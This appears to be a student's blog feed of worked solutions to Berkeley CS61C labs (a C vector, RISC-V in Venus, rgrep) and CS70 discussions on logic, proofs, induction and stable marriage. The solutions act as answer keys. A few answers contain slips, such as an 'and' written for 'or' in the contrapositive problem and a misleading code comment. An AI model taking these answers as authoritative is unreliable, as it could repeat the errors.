&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Now we need to initialize our data.</span></span><br><span class="line"><span class="comment">	   Since retval-&gt;data should be able to dynamically grow,</span></span><br><span class="line"><span class="comment">	   what do you need to do? */</span></span><br><span class="line">	retval-&gt;<span class="built_in">size</span> = <span class="comment">/* YOUR CODE HERE */</span><span class="number">1</span>;</span><br><span class="line">	retval-&gt;data = <span class="comment">/* YOUR CODE HERE */</span>(<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Check the data attribute of our vector to make sure we got memory */</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="comment">/* YOUR CODE HERE */</span>retval-&gt;data == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">free</span>(retval);				<span class="comment">//Why is this line necessary?</span></span><br><span class="line">        allocation_failed();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Complete the initialization by setting the single component to zero */</span></span><br><span class="line">	<span class="comment">/* YOUR CODE HERE */</span>retval-&gt;data[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* and return... */</span></span><br><span class="line">	<span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Return the value at the specified location/component "loc" of the vector */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vector_get</span><span class="params">(<span class="keyword">vector_t</span> *v, <span class="keyword">size_t</span> loc)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* If we are passed a NULL pointer for our vector, complain about it and exit. */</span></span><br><span class="line">	<span class="keyword">if</span>(v == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"vector_get: passed a NULL vector.\n"</span>);</span><br><span class="line">        <span class="built_in">abort</span>();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* If the requested location is higher than we have allocated, return 0.</span></span><br><span class="line"><span class="comment">	 * Otherwise, return what is in the passed location.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (loc &lt; <span class="comment">/* YOUR CODE HERE */</span>v-&gt;<span class="built_in">size</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="comment">/* YOUR CODE HERE */</span>v-&gt;data[loc];</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Free up the memory allocated for the passed vector.</span></span><br><span class="line"><span class="comment">   Remember, you need to free up ALL the memory that was allocated. */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vector_delete</span><span class="params">(<span class="keyword">vector_t</span> *v)</span> </span>&#123;</span><br><span class="line">	<span class="comment">/* YOUR SOLUTION HERE */</span></span><br><span class="line">	<span class="built_in">free</span>(v-&gt;data);</span><br><span class="line">	<span class="built_in">free</span>(v);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set a value in the vector. If the extra memory allocation fails, call allocation_failed(). */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vector_set</span><span class="params">(<span class="keyword">vector_t</span> *v, <span class="keyword">size_t</span> loc, <span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">	<span class="comment">/* What do you need to do if the location is greater than the size we have</span></span><br><span class="line"><span class="comment">	 * allocated?  Remember that unset locations should contain a value of 0.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* YOUR SOLUTION HERE */</span></span><br><span class="line">	<span class="keyword">if</span> (loc &lt; v-&gt;<span class="built_in">size</span>) &#123;</span><br><span class="line">		v-&gt;data[loc] = value;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">int</span> *newdata = (<span class="keyword">int</span>*)<span class="built_in">realloc</span>(v-&gt;data, (loc + <span class="number">1</span>)*<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">		<span class="keyword">int</span> i = v-&gt;<span class="built_in">size</span>;</span><br><span class="line">		<span class="keyword">if</span> (newdata == <span class="literal">NULL</span>) &#123;</span><br><span class="line">			allocation_failed();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// now v-&gt;data == NULL, v-&gt;size unchanged</span></span><br><span class="line">		<span class="keyword">while</span> (i &lt; loc) &#123;</span><br><span class="line">			newdata[i] = <span class="number">0</span>;</span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line">		newdata[loc] = value;</span><br><span class="line"></span><br><span class="line">		v-&gt;data = newdata;</span><br><span class="line">		v-&gt;<span class="built_in">size</span> = loc + <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CS61C</category>
      </categories>
      <tags>
        <tag>Machine Structure</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61c-lab03</title>
    <url>/2018/11/22/cs61c-lab03/</url>
    <content><![CDATA[<h1 id="Familiarizing-yourself-with-Venus"><a href="#Familiarizing-yourself-with-Venus" class="headerlink" title="Familiarizing yourself with Venus"></a>Familiarizing yourself with Venus</h1><p>Task: Paste the contents of <code>lab3_ex1.s</code> in Venus and Record your answers to the following questions. Some of the questions will require you to run the RISC-V code using Venus’ simulator tab.</p>
<p>What do the .data, .word, .text directives mean (i.e. what do you use them for)? Hint: think about the 4 sections of memory.<br><span style="color:red">.data: subsequent items put in user data segment; .word: Store the n 32-bit quantities in successive memory words; .text: subsequent items put in user text segment(machine code)</span></p>
<p>Run the program to completion. What number did the program output? What does this number represent?</p>
<p><span style="color:red">34, the number represents the 9th fibonacci number</span></p>
<p>At what address is <code>n</code> stored in memory? Hint: Look at the contents of the registers.</p>
<p><span style="color:red">at address 0x10000010</span></p>
<p>Without using the “Edit” tab, have the program calculate the 13th fib number (0-indexed) by manually modifying the value of a register. You may find it helpful to first step through the code. If you prefer to look at decimal values, change the “Display Settings” option at the bottom.</p>
<p><span style="color:red">We can achieve this by mannualy manipulate the value of counter register t3 to 13</span></p>
<h1 id="Translating-from-C-to-RISC-V"><a href="#Translating-from-C-to-RISC-V" class="headerlink" title="Translating from C to RISC-V"></a>Translating from C to RISC-V</h1><p>Task: Find/explain the following components of this assembly file.</p>
<p>The register representing the variable k.<br>The registers acting as pointers to the source and dest arrays.<br>The assembly code for the loop found in the C code.<br>How the pointers are manipulated in the assembly code.</p>
]]></content>
      <categories>
        <category>CS61C</category>
      </categories>
      <tags>
        <tag>RISC</tag>
        <tag>machine structure</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61c-hw02</title>
    <url>/2018/10/13/cs61c-hw02/</url>
    <content><![CDATA[<h1 id="Goals"><a href="#Goals" class="headerlink" title="Goals"></a>Goals</h1><p>The objective of this assignment is to get you familiar with string/pointer manipulation and C code. You’ll also likely get lots of good experience debugging with cgdb (or enhance your ability to use print statements).</p>
<h1 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h1><p>grep is a UNIX utility that is used to search for patterns in text files. It’s a powerful and versatile tool, and in this assignment you will implement a version that, while simplified, should still be useful.</p>
<p>Your assignment is to complete the implementation of rgrep, our simplified version of grep. rgrep is “restricted” in the sense that the patterns it matches only support a few regular operators (the easier ones). The way rgrep is used is that a pattern is specified on the command line. rgrep then reads lines from its standard input and prints them out on its standard output if and only if the pattern “matches” the line or some subsection of it. For example, we can use rgrep to search for lines that contain filenames that are at least 3 characters long (plus the “.txt”) as follows:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># show the contents of test_file.in:</span><br><span class="line">$ cat test_file.in</span><br><span class="line"></span><br><span class="line">fine.txt</span><br><span class="line">reallylong.txt</span><br><span class="line">abc.txt</span><br><span class="line">s.txt</span><br><span class="line">nope.pdf</span><br><span class="line"></span><br><span class="line">$ .&#x2F;rgrep &#39;...+\.txt&#39; &lt; test_file.in</span><br><span class="line"></span><br><span class="line">fine.txt</span><br><span class="line">reallylong.txt</span><br><span class="line">abc.txt</span><br></pre></td></tr></table></figure>
<p>What’s going on here? rgrep was given the pattern “…+.txt”; it printed only the lines from its standard input (the contents of test_file.in) that matched this pattern. How can you tell if a line matches the pattern? A line matches a pattern iff the pattern “appears” somewhere inside the line. In the absence of any special operators, seeing if a line matches a pattern reduces to seeing if the pattern occurs as a substring anywhere in the line. So for most characters, their meaning in a pattern is just to match themselves in the target string. However, there are a few special clauses you must implement:</p>


<p>So, here are some examples of patterns and the kind of lines they match:</p>


<p>These are the only special characters you have to handle. With the exception of the null character that terminates a string, you should not have to handle other characters in any special way. You may assume that your code will not be run against patterns that don’t make sense.</p>
]]></content>
      <categories>
        <category>CS61C</category>
      </categories>
      <tags>
        <tag>Machine Structure</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>CS70-disc00a</title>
    <url>/2018/10/03/cs70-disc00a/</url>
    <content><![CDATA[<h1 id="Writting-in-Propositional-Logic"><a href="#Writting-in-Propositional-Logic" class="headerlink" title="Writting in Propositional Logic"></a>Writting in Propositional Logic</h1><p>For rach of the following sentences,translate the sentence into propositional logic using the notation introduced in class,and write its negation.</p>
<p>(a) The square of a nonzero integer is positive.</p>
<p>We can rephrase the sentence as “If n is a nonzero integer, then $n^2&gt;0$”. Which can be written as<br>$$\forall n \in \mathbb{Z},(n \neq 0) \Rightarrow (n^2&gt;0)$$<br>or equivalently as<br>$$\forall n \in \Bbb{Z},(n = 0) \lor (n^2&gt;0)$$<br>The latter is easier to negate, which is given by<br>$$\exists n \in \Bbb{Z},(n \neq 0) \land (n^2&lt;=0)$$</p>
<a id="more"></a>

<p>(b) There are no integer solutions to the equation $x^2-y^2=10$.</p>
<p>The sentence is<br>$$\forall x,y \in \Bbb{Z}, x^2-y^2\neq 10$$<br>The negation is<br>$$\exists x,y \in \Bbb{Z}, x^2-y^2=10$$</p>
<p>(c) There is one and only one real solution to the equation $x^3 +x+1 = 0$.</p>
<p>Let $p(x)=x^3+x+1$.The sentence can be read “there is a aolution $x$ to the equation $p(x)=0$, and any other solution $y$ is equal to $x$”. Or,<br>$$\exists x \in \Bbb{R},((p(x)=0)\land(\forall y \in \Bbb{R},(p(y)=0) \Rightarrow (x=y)))$$<br>Its negation is given by<br>$$\forall x \in \Bbb{R},((p(x)\neq0)\lor(\exists y \in R,(p(y)=0)\land(x\neq y)))$$</p>
<p>(d) For any two distinct real numbers, we can find a rational number in between them.</p>
<p>The sentence can be read “if $x$ and $y$ are distince real numbers, then there is a rational number $z$ between $x$ an $y$.” Or,<br>$$\forall x,y \in \Bbb{R},(x \neq y) \Rightarrow (\exists z \in \Bbb{Q}, ((x &lt; z &lt; y) \lor (y&lt;z&lt;x))$$<br>Equivalently,<br>$$\forall x,y \in \Bbb{R},(x=y)\lor(\exists z \in \Bbb{Q},((x&lt;z&lt;y)\lor(y&lt;z&lt;x)))$$<br>Note that $x&lt;z&lt;y$ is mathematical shorthand for $(x&lt;z)\land(z&lt;y)$, so the above statement is equivalent to<br>$$\forall x,y \in \Bbb{R},(x=y)\lor(\exists z \in \Bbb{Q},((x&lt;z)\land(z&lt;y)) \lor ((y&lt;z)\land(z&lt;x))$$<br>Then the negation is<br>$$\exists x,y \in \Bbb{R},(x \neq y) \land (\forall z \in \Bbb{Q}, ((x \ge z)\lor(z\ge y))\land((y\ge z)\lor(z\ge  x)))$$</p>
<h1 id="Implication"><a href="#Implication" class="headerlink" title="Implication"></a>Implication</h1><p>Which of the following implications are always true, regardless of P?Give a counterexample for each false assertion(i.e. come up with a statement P(x,y) that would make the implication false).</p>
<p>(a) $\forall x, \forall y, P(x,y) \Rightarrow \forall y,\forall x,P(x,y)$.</p>
<p>This is true because $\forall x, \forall y$ and $\forall y, \forall x$ are both means all x and y in our universe.</p>
<p>(b) $\exists x,\exists y,P(x,y)\Rightarrow \exists x, \exists y, P(x,y)$</p>
<p>This is true. There exists can be switched if they are adjacent;$\exists x,\exists y$ and $\exists y,\exists x$ are both means there exists x and y in our universe.</p>
<p>(c) $\forall x, \exists y,P(x,y) \Rightarrow \exists y, \forall x, P(x,y)$.</p>
<p>False.Let P(x,y) be $x&lt;y$ and the universe for x and y be the integers.Then we can find the former is true, while the latter is false.</p>
<p>(d) $\exists x,\forall y,P(x,y) \Rightarrow \forall y,\exists x,P(x,y)$</p>
<p>True.The first says that there exists an $x$, say $x’$ for every $y$,$P(x,y)$ is true. Thus, one can choose $x=x’$ for the second statement and that statement will be true for every $y$.Note that the two statements are not equivalent as the converse of this is statement 3, which is false.</p>
<h1 id="Logic"><a href="#Logic" class="headerlink" title="Logic"></a>Logic</h1><p>Decide whether each of the following is true or false and justify your answer.</p>
<p>(a) $\forall x(P(x)\land Q(x)) \equiv \forall x P(x) \land \forall x Q(x)$</p>
<p>This is true by drawing a truth table to see.</p>
<p>(b) $\forall x(P(x) \lor Q(x))\equiv \forall x P(x) \lor \forall x Q(x)$</p>
<p>This is false. If P(1) is true and Q(1) is false, P(2) is flase and Q(2) is true. Then the left hand side is true, while the right hand side is false.</p>
<p>(c) $\exists x(P(x) \lor Q(x)) \equiv \exists x P(x) \lor \exists x Q(x)$</p>
<p>This is true by drawing a truth table to see.</p>
<p>(d) $\exists x (P(x) \land Q(x)) \equiv \exists x P(x) \land \exists x Q(x)$</p>
<p>False. Let $P(1)$ be true while other values be false.Let $Q(1)$ be false while other values be true. Then the right hand side is true, while the left hand side is false.There would be no value for both $P(x)$ and $Q(x)$ simultaneously true.</p>
]]></content>
      <categories>
        <category>CS70</category>
      </categories>
      <tags>
        <tag>math</tag>
      </tags>
  </entry>
  <entry>
    <title>cs70-disc00b</title>
    <url>/2018/10/04/cs70-disc00b/</url>
    <content><![CDATA[<h1 id="Contraposition"><a href="#Contraposition" class="headerlink" title="Contraposition"></a>Contraposition</h1><p>Prove the statement “if $a+b&lt;c+d$, then $a&lt;c$ or $b&lt;d$”.</p>
<p>The implication we are trying to prove is $(a+b&lt;c+d)\Rightarrow((a&lt;c)\land(b&lt;d))$, so the contrapositive is $((a\ge c)\land(b\ge d)) \Rightarrow (a+b \ge c+d)$. The proof is straightforward, since we have both that $a\ge c$ and $b\ge d$,we can just add these two inequalities together, giving us $a+b\ge c+d$, which is exactly what we want to prove.</p>
<a id="more"></a>
<h1 id="Perfect-Square"><a href="#Perfect-Square" class="headerlink" title="Perfect Square"></a>Perfect Square</h1><p>A <em>perfect square</em> is an integer $n$ of the form $n=m^2$ for some integer m. Prove that every odd perfect square is of the form $8k+1$ for some integer $k$.</p>
<p>We will proceed with a direct proof.Let $n=m^2$ for some integer m. Since n is odd, then m is also odd, i.e., of the form $m=2l+1$ for some integer $l$.Then $m^2=4l^2+1+4l=4l(l+1)+1$. Since one of $l$ and $l+1$ must be even, $l(l+1)$ is of the form $2k$ and $n=m^2=8k+1$.</p>
<h1 id="Number-of-Friends"><a href="#Number-of-Friends" class="headerlink" title="Number of Friends"></a>Number of Friends</h1><p>Prove that if there are $n\ge 2$ people at a party, then at least 2 of them have the same number of friends at the party.<br>(Hint: <em>The Pigeonhole Princle</em> states that if $n$ items are placed in $m$ containers, where $n&gt;m$, at least one container must contain more than one item. You may use this without proof.)</p>
<p>There are two thoughts of this problem. First, we will prove this using contradiction. Suppose the contrary is that everyone has a different number of friends at the party.Since the number of friends that each person can hava ranges from 0 to $n-1$, we conclude that for every $i \in {0,1,…,n-1}$, there is exactly one person who has exactly $i$ friends at the party. In paticular, there is one person who has $n-1$ fiends(i.e. friends with everyone) and there is one person who has $0$ friends(i.e. friends with no one), which is contradiction. Second, we can think of this question using pigeonhole principle. Here we have $n$ n possible containers. Each container denotes the number of friends one person can have, so the container can be labeled 0,1,…,$n - 1$. The objects assigned to these containers are the people at the party. However, container 0, $n-1$ can not be occupied at the same time, this means we are assigning $n$ people to at most $n-1$ containers, and by pigeonhole princile, at least one of the $n-1$ containers has to have two or more objects i.e. at least two people have to have the same number of friends.</p>
<h1 id="Fermat’s-Contradiction"><a href="#Fermat’s-Contradiction" class="headerlink" title="Fermat’s Contradiction"></a>Fermat’s Contradiction</h1><p>Prove that $2^{1/n}$ is not rational for any integer $n\ge 3$.(Hint: Use Fermat’s Last Theorem)</p>
<p>We will proceed with contradiction. Assuming that $2^{1/n}$ is rational for ant integer $n\ge 3$. Then we have $2^{1/n}=\frac p q$, which p and q are all positive integers. Thus, $2q^n=p^n$, and this implies<br>$$q^n+q^n=p^n$$<br>which is a contradiction to the Fermat’s Last Therom.(No positive number $a$, $b$ and $c$ satisfy the equation $a^n+b^n=c^n$ for any integer value of $n$ greater than 2).</p>
<h1 id="Prime-Form"><a href="#Prime-Form" class="headerlink" title="Prime Form"></a>Prime Form</h1><p>Prove that every prime number $m&gt;3$ is either of the form $6k+1$ or $6k-1$ for some integer $k$.</p>
<p>We proceed using proof by cases. We know that any integer can be expressed as $6k+i$, where $i\in {0, 1, 2, 3, 4, 5}$. So we have the following 6 cases:</p>
<ol>
<li>$m=6k$, which can’t be true because m can’t be a prime.(has other factors other than one and itself)</li>
<li>$m=6k+1$, this could be prime.</li>
<li>$m=6k+2$, this can not be prime since $m=2(3k+1)$.</li>
<li>$m=6k+3$, this can not be prime since $m=3(2k+1)$.</li>
<li>$m=6k+4$, this can not be prime since $m=2(3k+2)$.</li>
<li>$m=6k+5$, this could be prime and $m=6(k+1)-1$.</li>
</ol>
<p>Therefore, if $m$ is prime number, it must either have form $6k+1$ or $6k-1$.</p>
]]></content>
      <categories>
        <category>CS70</category>
      </categories>
      <tags>
        <tag>math</tag>
      </tags>
  </entry>
  <entry>
    <title>cs70-disc01b</title>
    <url>/2018/10/05/cs70-disc01b/</url>
    <content><![CDATA[<h1 id="Stable-Marriage"><a href="#Stable-Marriage" class="headerlink" title="Stable Marriage"></a>Stable Marriage</h1><p>Consider the set of men $M={1,2,3}$ and the set of women $W={A,B,C}$ with the following preferences.</p>

<p>Run the male propose-and-reject algorithm on this example. How many days does it take and what is the resulting pairing?(Show your work.)</p>
<a id="more"></a>
<p>The algorithm takes 3 days to produce a matching. The resulting pairing is as follows. The circles indicate a man that a woman picked on that given day(and rejected the rest).<br>$${(A,1),(B,2),(C,3)}$$</p>


<h1 id="Stable-Marriage-1"><a href="#Stable-Marriage-1" class="headerlink" title="Stable Marriage"></a>Stable Marriage</h1><p>The following questions refer to stable marriage instances with $n$ men and $n$ women, answer True/False or provide an expression as requested.<br>(a) For $n=2$, or any 2-man, 2-woman stable marriage instance, man A has the same optimal and pessimal woman.(True or False)</p>
<p><strong>False.</strong> This says there is only one stable pairing. But if the preference list for man A is (1,2) and for man B is (2,1) and preference list for woman 1 is (B,A) and woman2 is (A,B) produce a different male and female optimal pairing.</p>
<p>(b) In any stable marriage instance, in the pairing the TMA(traditional stable marriage algorithm) produces there is some man who gets his favorite woman(the first woman on his preference list).(True or False.)</p>
<p><strong>False.</strong> Let man A have preference list(1,3,2), B have (1,2,3), and C have (2,1,3). We develop a “cyclic” chain of preferences, causing A to displace B to displace C who then displaces A.</p>
<ol>
<li>If woman 1 prefers A over B, she puts A on a string and rejects B.</li>
<li>B does not get his favorite and proposes to 2, who prefer B over C and then rejects C.</li>
<li>C does not get his favorite and proposes to 1, who prefer C over A and rejects A.<br>Thus, A also does not get his favorite, and no man gets his favorite.

</li>
</ol>
<p>(c) In any stable marriage instance with $n$ men and women, if every man has a different favorite<br>woman, a different second favorite, a different third favorite, and so on, and every woman has<br>the same preference list, how many days does it take for TMA to finish? (Form of Answer: An<br>expression that may contain $n$.)</p>
<p><strong>The answer is 1</strong>. On the first day every woman gets a proposal since each man has a different woman in their first position. The algorithm terminates.</p>
<p>(d) Consider a stable marriage instance with $n$ men and $n$ women, and where all men have the same preference list, and all women have different favorite men, and different second-favorite men, and so on. How many days does the TMA take to finish? (Form of Answer: An expression that may contain $n$.)</p>
<p><strong>The answer is n</strong>. Every man proposes to their common favorite. One man is kept on the string. The rest propose to the second. And so one. After each day, a new woman gets a man on a string. After $n$ days, we finish. Note that the men’s preference lists(Assuming they’re the same for everyone) is irrelevant.</p>
<p>(e) It is possible for a stable pairing to have a man A and a woman 1 be paired if A is 1’s least preferred choice and 1 is A’s least preferred choice. (True or False.)</p>
<p><strong>True.</strong>A and 1 are respectively all the women’s and men’s least favorite.</p>
<p>(f) It is possible for a stable pairing to have two couples where each person is paired with their least favorite choice. (True or False.)</p>
<p><strong>False</strong>. Assume for the sake of contradiction that it is possible to have two couples where each person is paired with their least favorite choice. Consider $(m,w)$ and $$(m^<em>,w^</em>)$$, where $m$ and $w$ is paired despite being each other’s last choice, as are $$m^<em>$$ and $$w^</em>$$. Since $m$ is $w$’s last choice, she prefers $$m^<em>$$ to her current partner. But $$w^</em>$$ is $$m^<em>$$’s last choice, he prefers $w$ to his current partner. Thus, $w$ and $$m^</em>$$ form a rogue couple, showing that no pairing with this situation can be stable.</p>
<p>(g) If there is a pairing, P, that consists of only pairs from male and female optimal pairings, then it must be stable. In other words, if every pair in P is a pair either in the male-optimal or the female-optimal pairing then P is stable. (True or False.)</p>
<p><strong>False</strong>. Consider a woman who is matched to her pessimal partner and a man who is matched to his pessimal partner. They may well like each other.<br>An example is as follows.<br>Men’s preference list<br>A: 1 &gt; … &gt; 2<br>B: 2 &gt; … &gt; 1<br>C: 3 &gt; … &gt; 4<br>D: 4 &gt; … &gt; 3<br>Women’s preference list<br>1: B &gt; … &gt; A<br>2: A &gt; … &gt; B<br>3: D &gt; … &gt; C<br>4: C &gt; … &gt; D<br>Men’s first choices = women’s last choices and vice versa.<br>men-optimal: (A,1), (B,2), (C,3), (D,4)<br>women-optimal: (B,1), (A,2), (D,3), (C,4)<br>our pairing: (A,1), (B,2), (D,3), (C,4). Note that 1,2,C, and D are all with their pessimal<br>partner, so any pairing of 1 or 2 with C or D will be rogue. For example, (C,1) is a rogue couple.</p>
<h1 id="Good-Better-Best"><a href="#Good-Better-Best" class="headerlink" title="Good, Better, Best"></a>Good, Better, Best</h1><p>In a particular instance of the stable marriage problem with $n$ men and $n$ women, it turns out that there are exactly three distinct stable matchings, $S1$, $S2$, and $S3$. Also, each man $m$ has a different partner in the three matchings. Therefore each man has a clear preference ordering of the three matchings (according to the ranking of his partners in his preference list). Now, suppose for man $m1$, this order is $S1 &gt; S2 &gt; S3$.</p>
<p>Prove that every man has the same preference ordering $S1 &gt; S2 &gt; S3$.</p>
<p><em>Hint: Recall that a male-optimal matching always exists and can be generated using TMA. By reversing the roles of TMA, what other matching can we generate?</em></p>
<p>In class, you were given the traditional propose-and-reject algorithm, which was guaranteed to produce a male-optimal matching. By switching men’s and women’s roles, you would be guaranteed to produce a female-optimal matching, which, by a lemma from class, would also be malepessimal. By the very fact that these algorithms exist and have been proven to work in this way, you’re guaranteed that a male-optimal and a male-pessimal matching always exist.</p>
<p>Since there are only three matchings in this particular stable matching instance, we thus know that one of them must be male-optimal and one must be male-pessimal. Since $m1$ prefers $S1$ above the other stable matchings, only that one can be male-optimal by definition of male-optimality. Similarly, since $m1$ prefers $S3$ the least, it must be the male-pessimal. Therefore, again from<br>definitions of optimality/pessimality, since each men have different matches in the three stable matchings, they must strictly prefer $S1$ to both of the others, and they must like $S3$ strictly less than both of the others. Thus, each man’s preference order of stable matchings must be $S1,S2,S3$.</p>
]]></content>
      <categories>
        <category>CS70</category>
      </categories>
      <tags>
        <tag>math</tag>
      </tags>
  </entry>
  <entry>
    <title>cs70-disc01a</title>
    <url>/2018/10/04/cs70-disc01a/</url>
    <content><![CDATA[<h1 id="Induction"><a href="#Induction" class="headerlink" title="Induction"></a>Induction</h1><p>Prove the following using induction:<br>(a) For all natural numbers $n&gt;2,2^n&gt;2n+1$.</p>
<p>We proceed by induction on the variable $n$.<br>Base case$(n=3)$:$8&gt;7$, which is correct.<br>Inductive Hypothesis:For arbitrary $n=m&gt;2$, assume that $2^m&gt;2m+1$.<br>Inductive Step: Because $m$ is positive number, then we have $2m&gt;1$, so:<br>$$2^{m+1}=2\cdot 2^m &gt; 2 \cdot (2m+1) = 4m+2 =2m+2m+2&gt;2m+3$$<br>So we have $2^{m+1}&gt;2(m+1)+1$,which completes the inductive step.</p>
<a id="more"></a>
<p>(b) For all positive integers $n$, $1^3+3^3+5^3+…+(2n-1)^3=n^2(2n^2-1)$.</p>
<p>For $n=1$, the statement is $1=1$, which is true. Assume that it holds for $n=m$. Then,<br>$$<br>\begin{align}<br>\sum_{k=1}^{m+1} (2k-1)^3 &amp; = \sum_{k=1}^{m} (2k-1)^3 + (2m+1)^3=m^2(2m^2-1)+(2m+1)^3 \<br>&amp; = 2m^4+8m^3+11m^2+6m+1=(m+1)^2(2(m+1)^2-1)<br>\end{align}<br>$$</p>
<p>(c) For all positive natural numbers $n$,$\frac 5 4 \cdot 8^n+3^{3n-1}$ is divisible by 19.</p>
<p>For $n=1$, the statement is true because of 19 is divisible by 19. Assume that the statement holds for $n=m$, such that $\frac 5 4 \cdot 8^m + 3^{3m-1}$ is divisible by 19. Then we have<br>$$<br>\begin{align}<br>\frac 5 4 \cdot 8^{m+1} + 3^{3(m+1)-1} &amp; = 8 \cdot \frac 5 4 8^m + 3^{3m-1+3} \<br>&amp; = 8\cdot (\frac 5 4 \cdot 8^m + 3^{3m-1}) + 19\cdot 3^{3m-1}<br>\end{align}<br>$$<br>The first term is divisible by 19 because of induction hypothesis, and the second term is clearly divisible by 19.This completes our proof, as we have shown the statement holds for $m+1$.</p>
<h1 id="Make-It-Stronger"><a href="#Make-It-Stronger" class="headerlink" title="Make It Stronger"></a>Make It Stronger</h1><p>Suppose that the sequence $$a_1$$,$$a_2$$,$$…$$ is defined by $$a_1=1$$ and $a_{n+1}=3a_n^2$ for $n \ge 1$. We want to prove that $a_n \le 3^{2^n}$ for every positive integer $n$.</p>
<p>(a) Suppose that we want to prove this statement using induction, can we let our induction hypothesis be simply $a_n \le 3^{2^n}$? Show why this does not work.</p>
<p>Try to prove for every $n\ge 1$, we have $a_n\le 3^{2^n}$ using induction.<br>Base case: For $n=1$, we have $a_1=1 \le 3^{2^1}=9$.<br>Inductive hypothesis: For $n&gt;1$, assume that $a_n\le 3^{2^n}$.<br>Inductive step:<br>$$<br>\begin{align}<br>a_{n+1}\le 3\cdot (3^{2^n})^2 &amp; =3\cdot 3^{2^{n+1}} \<br>&amp; = 3^{2^{n+1}+1}<br>\end{align}<br>$$<br>However, what we wanted to prove is $a_{n+1} \le 3^{2^{n+1}}$. There is an extra +1 in the exponent of what we derived.</p>
<p>(b) Try to instead prove the statement $a_n\le 3^{2^n-1}$ using induction. Does this statement imply what you tried to prove in the previous part?</p>
<p>Base case: $n=1, a_1=1 \le 3^{2^1 - 1}=3$<br>Inductive hypothesis: For every $n&gt;1$, assume that $a_n \le 3^{2^n-1}$<br>Inductive step:<br>$$<br>\begin{align}<br>a_{n+1} \le 3\cdot (3^{2^n -1})^2 &amp; = 3\cdot 3^{2^{n+1}-2} \<br>&amp; = 3^{2^{n+1}-1}<br>\end{align}<br>$$<br>This is exactly the induction hypothesis for $n+1$. Note that for every $n\ge 1$, we have $2^n-1\le2^n$ and therefore $3^{2^n-1}\le3^{2^n}$. This means that our modified hypothesis which we proved here is indeed imply what we wanted to prove in the previous part. This is called “strengthening” the induction hypothesis because we proved a stronger statement and by proving this statement to be true, we proved the original statement to be true as well.</p>
<h1 id="Bit-String"><a href="#Bit-String" class="headerlink" title="Bit String"></a>Bit String</h1><p>Prove that every positive integer $n$ can be written with a string of 0s and 1s. In other words, prove that we can write<br>$$n = c_k\cdot 2^k + c_{k-1}\cdot 2^{k-1}+…+c_1\cdot 2^1+c_0\cdot 2^0$$<br>where $k \in \Bbb{N}$ and $c_k \in {0,1}$.</p>
<p>Base case: $n=1$ can be written as $1 = 1 \times 2^0$<br>Inductive hypothesis: Assume that the statement holds for all $1\le k\le n$<br>Inductive step: There are two kinds of possibilities for $n+1$. If $n+1$ is even, then we can apply our inductive hypothesis to $(n+1)/2$ and use its representation to express $n+1$ in the desired form.<br>$$<br>\begin{align}<br>(n+1)/2 &amp; = c_k\cdot 2^k + c_{k-1}\cdot 2^{k-1}+…+c_1\cdot 2^1+c_0\cdot 2^0 \<br>n + 1 = 2\cdot (n+1) / 2 &amp; = c_k\cdot 2^{k+1} + c_{k-1}\cdot 2^{k}+…+c_1\cdot 2^2+c_0\cdot 2^1<br>\end{align}<br>$$<br>Otherwise, $n$ must be even and have $c_0=0$. We can obtain the representation of $n+1$ from $n$.<br>$$<br>\begin{align}<br>n &amp; =c_k\cdot 2^k + c_{k-1}\cdot 2^{k-1}+…+c_1\cdot 2^1+0\cdot 2^0 \<br>n+1 &amp; = c_k\cdot 2^k + c_{k-1}\cdot 2^{k-1}+…+c_1\cdot 2^1+1\cdot 2^0<br>\end{align}<br>$$<br>Therefore, the statement is true.</p>
]]></content>
      <categories>
        <category>CS70</category>
      </categories>
      <tags>
        <tag>math</tag>
      </tags>
  </entry>
  <entry>
    <title>cs70-homework00</title>
    <url>/2018/10/04/cs70-homework00/</url>
    <content><![CDATA[<h1 id="LATEX"><a href="#LATEX" class="headerlink" title="LATEX"></a>LATEX</h1>

<p>(a) $\forall x\exists y((P(x)\land Q(x,y)) \Rightarrow x\le \sqrt y)$<br>(b) $\sum_{i=0}^k i = \frac {k(k+1)} 2$</p>
]]></content>
      <categories>
